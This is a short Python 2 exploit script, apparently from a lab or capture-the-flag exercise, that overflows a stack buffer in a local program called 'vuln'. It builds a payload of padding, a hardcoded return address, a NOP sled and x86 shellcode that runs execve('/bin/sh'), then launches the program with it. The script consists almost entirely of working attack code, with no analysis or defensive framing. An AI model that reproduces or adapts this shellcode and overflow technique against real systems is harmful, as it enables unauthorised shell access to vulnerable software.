#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

# Stack address where shellcode is copied.
ret_addr = 0xbffff604
ret_addr = 0xbffff504
ret_addr += 0x14 + 0x4 + 0x4

# Spawn a shell
# execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# endianess convertion
def conv(num):
    return struct.pack("<I",num)

# buf size = 261
buf = "A" * (0x14 + 0x4)            # buffer + ebp
buf += conv(ret_addr)               # return addr
buf += "\x90" * 100                 # sled
buf += scode                        # shellcode
buf += "C" * (261 - len(buf))       # padding

print "Calling vulnerable program"
call(["./vuln", "user", buf])
